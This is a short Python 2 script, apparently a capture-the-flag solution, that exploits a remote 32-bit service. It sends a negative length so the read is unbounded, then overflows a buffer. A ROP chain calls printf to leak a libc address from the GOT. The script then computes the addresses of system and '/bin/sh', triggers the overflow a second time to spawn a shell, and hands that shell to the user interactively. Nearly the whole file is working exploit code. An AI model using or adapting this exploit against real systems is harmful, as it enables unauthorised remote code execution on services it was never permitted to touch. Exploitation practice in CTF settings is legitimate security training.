#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
# s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

recvuntil("read? ")
s.send("-1\n")
recvuntil("data!\n")

def leak(addr):
        out = ''
        out += p32(0x08048370) # printf
        out += p32(0x0804864e) # pop pop
        out += p32(0x8048702) # %s
        out += p32(addr) # address
        out += p32(0x08048370) # printf
        out += p32(0x0804835d) # pop
        out += p32(0x80486c8) # \n
        return out

# we can use the leak function to leak some addresses like
# printf and others and find out the libc used on the server

printf_got = 0x0804a00c
printf_offset = 0x0004d280
system_offset = 0x00040190
binsh_offset = 0x00160a24

p = ''
p += p32(0x08048370) # printf
p += p32(0x0804852f) # vuln function
p += p32(0x8048702) # %s
p += p32(printf_got) # address

s.send("I"*48 + p + '\n')
recvuntil('\n')

t = recvuntil('\n')
printf_addr = u32(t[:4])
libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
print '[+] libc_base @ %#x' % libc_base
print '[+] printf @ %#x' % printf_addr
print '[+] system @ %#x' % system_addr

# at this point `printf` has returned and we triggered again the vuln, so we
# can insert data to overflow the ret address and hijack the control flow. This
# time we do know addresses in the libc and we can call system

p = ''
p += p32(system_addr)
p += p32(0xdeadbeef)
p += p32(binsh_addr)

recvuntil("read? ")
s.send("-1\n")
recvuntil("data!\n")
s.send('I'*48 + p + '\n')
recvuntil('\n')

s.send('id\n')
t = s.recv(1024)
print t
if 'uid' in t:
        print "[+] Interactive shell"
        interactive()
        sys.exit(0)

s.close()
